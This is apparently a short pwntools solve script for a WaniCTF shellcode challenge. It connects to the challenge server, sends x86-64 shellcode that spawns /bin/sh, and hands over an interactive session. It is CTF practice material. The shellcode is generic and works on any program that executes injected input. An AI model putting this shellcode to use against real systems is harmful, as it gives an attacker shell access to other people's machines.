from pwn import *

pc = process("./chall")
pc = remote("shell-basic-pwn.wanictf.org",9004)
shell_code = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"  # PUT YOUR SHELL CODE HERE
pc.sendline(shell_code)
pc.interactive()
